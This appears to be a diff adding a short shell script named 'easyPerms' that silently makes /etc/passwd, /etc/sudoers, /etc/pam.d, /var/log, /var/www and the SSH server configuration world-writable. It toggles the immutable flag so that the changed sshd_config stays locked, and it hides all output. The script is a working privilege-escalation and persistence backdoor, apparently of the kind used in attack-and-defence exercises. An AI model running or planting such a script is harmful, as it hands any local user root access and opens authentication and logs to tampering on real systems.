@@ -1,0 +1,17 @@
+#!/bin/sh
+
+easyPerms ()
+{
+	## Make specific files world accessible (777)
+	chmod 777 /etc/passwd
+	chmod 777 /etc/sudoers
+	chmod -R 777 /var/www
+	chmod -R 777 /var/log 
+	chmod -R 777 /etc/pam.d
+	
+	chattr -i /etc/ssh/sshd_config
+	chmod 777 /etc/ssh/sshd_config
+	chattr +i /etc/ssh/sshd_config
+}
+
+easyPerms > /dev/null 2>&1
